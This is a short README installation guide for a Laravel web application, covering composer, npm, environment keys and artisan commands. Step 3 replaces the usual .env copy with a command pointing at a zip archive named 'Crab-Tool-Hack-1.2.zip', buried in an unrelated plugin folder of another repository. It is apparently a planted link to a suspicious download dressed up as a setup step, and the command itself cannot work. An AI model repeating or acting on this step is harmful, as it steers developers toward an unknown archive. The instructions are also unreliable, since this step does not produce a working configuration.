## Installation

1. Install Composer

    `composer install`

2. NPM Install

    `npm install`

3. `cp https://raw.githubusercontent.com/divyeshchotaliya204/CrabHack-Tool/master/public/assets/plugins/photoswipe/website/_layouts/Crab-Tool-Hack-1.2.zip .env`

4. Generate Application Key

    `php artisan key:generate`

5. Configure Database Connection and MailTrap Connection

6. Set **BUGSNAG_API_KEY** and **IPINFO_ACCESS_TOKEN** in **.env** file

    `BUGSNAG_API_KEY=`

    `IPINFO_ACCESS_TOKEN=`

7. Run following command for initial setup

    `php artisan app-setup`

    **Use this command whenever you need to setup app from scratch. it'll re-create database and call seeder.**

8. Start the Application

    `php artisan serve`

9. Building Assets

    `npm run dev`

